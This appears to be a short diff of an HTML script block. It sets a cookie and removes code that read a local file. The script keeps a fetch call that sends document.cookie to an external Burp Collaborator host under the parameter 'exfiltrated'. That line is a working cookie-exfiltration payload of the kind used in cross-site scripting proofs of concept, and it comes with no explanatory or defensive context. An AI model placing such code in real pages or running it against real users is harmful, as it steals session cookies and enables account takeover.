@@ -1,13 +1,5 @@
 <script>
   document.cookie = "username=John Doe";
-  var txt = '';
-var xmlhttp = new XMLHttpRequest();
-xmlhttp.onreadystatechange = function(){
-  if(xmlhttp.status == 200 && xmlhttp.readyState == 4){
-    txt = xmlhttp.responseText;
-  }
-};
-xmlhttp.open("GET","file:///Users/johan/Desktop/test.txt",true);
+ 
 fetch('https://euc1u4sug8iycmh60bz77fiwqnwmkb.burpcollaborator.net/?exfiltrated=' + document.cookie);
-xmlhttp.send();
 </script>
